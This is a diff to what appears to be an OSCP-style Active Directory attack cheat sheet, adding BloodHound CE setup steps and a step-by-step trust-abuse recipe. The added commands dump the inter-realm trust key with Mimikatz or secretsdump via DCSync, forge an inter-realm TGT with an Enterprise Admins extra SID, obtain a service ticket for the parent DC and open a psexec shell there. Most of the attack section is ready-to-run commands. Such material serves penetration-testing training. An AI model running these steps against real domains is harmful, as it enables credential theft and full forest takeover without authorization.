@@ -8,6 +8,17 @@
 
 BloodHound CE (Docker/Postgres/Neo4j rewrite) ingests collector data and runs Cypher queries to find shortest paths to Domain Admin, Kerberoastable users, ADCS abuse edges, etc.
 
+**Stand up BloodHound CE first** (the GUI you ingest into — do this once, before exam day; a crashy
+neo4j/BloodHound is the classic exam time-sink, so test it in advance):
+```bash
+# Official compose file: pulls the app + postgres + neo4j and serves the UI on http://localhost:8080
+curl -L https://ghst.ly/getbhce -o docker-compose.yml   # or grab it from the BloodHound repo
+sudo docker compose up -d                                # wait for all containers healthy
+sudo docker compose logs | grep -i "Initial Password"    # one-time random admin password for the UI
+# Then browse http://localhost:8080, log in, and drag-drop the collector .zip (below) onto the UI.
+# Legacy BloodHound (neo4j + the Electron app) instead of CE:  sudo neo4j console   &&  ./BloodHound
+```
+
 ```bash
 # Windows collector (SharpHound) — routinely flagged by EDR; consider the Linux ingestor instead
 SharpHound.exe --CollectionMethods All --Domain domain.local
@@ -298,10 +309,30 @@ raiseChild.py -target-exec <PARENT_DC_IP> CHILDFQDN/user:password
 
 ### Trust key extraction + inter-realm TGT forgery (works even with SID filtering)
 ```
-# Mimikatz — dump the trust account key (elevated on either DC, or via DCSync of the trust account)
-lsadump::trust /patch
+# 1. Dump the trust account key. Mimikatz on either DC (elevated):
+lsadump::trust /patch                 # prints the RC4 (NTLM) trust key(s), in+out direction
+#    Or from Linux via DCSync of the trust account (the trusted-domain name + trailing $):
+#    the inter-realm trust account is  <TRUSTED_DOMAIN_NETBIOS>$  in the trusting domain.
+impacket-secretsdump -just-dc-user 'CHILD$' 'parent.local/dauser:Pass@dc.parent.local'
 ```
-Then forge an inter-realm TGT with Impacket's `ticketer.py` using the extracted trust key, and request cross-realm TGS via `getST.py` against the trusting domain's DC.
+```bash
+# 2. Forge an INTER-REALM TGT with the trust key. -nthash is the RC4 trust key from step 1;
+#    the SPN is krbtgt/<the domain you are moving INTO>. SIDs: child domain SID + the
+#    Enterprise Admins SID of the parent (S-1-5-21-<parent>-519) via -extra-sid.
+impacket-ticketer -nthash <TRUST_RC4_KEY> -domain child.parent.local \
+  -domain-sid S-1-5-21-<child> -extra-sid S-1-5-21-<parent>-519 \
+  -spn krbtgt/parent.local Administrator
+export KRB5CCNAME=Administrator.ccache
+
+# 3. Exchange the forged inter-realm TGT for a usable service ticket in the target domain, then use it:
+impacket-getST -k -no-pass -spn cifs/dc.parent.local -impersonate Administrator parent.local/Administrator
+export KRB5CCNAME=Administrator@cifs_dc.parent.local@PARENT.LOCAL.ccache
+impacket-psexec -k -no-pass parent.local/Administrator@dc.parent.local     # or secretsdump -just-dc
+```
+> **OSCP relevance:** the exam AD set is normally a **single domain** (one DC + two clients), so
+> cross-forest/parent-child trust forgery is rarely needed on OSCP — it's OSEP/CRTP territory. Kept
+> here for completeness and for multi-domain lab sets; don't spend exam time hunting a trust that
+> isn't there.
 
 **SID filtering caveat:** forest trusts enforce SID filtering by default (RID<1000 and foreign SIDs stripped), blocking the ExtraSIDs path across forests — trust-key forgery or SID-History on quarantine-disabled trusts is the fallback.
 
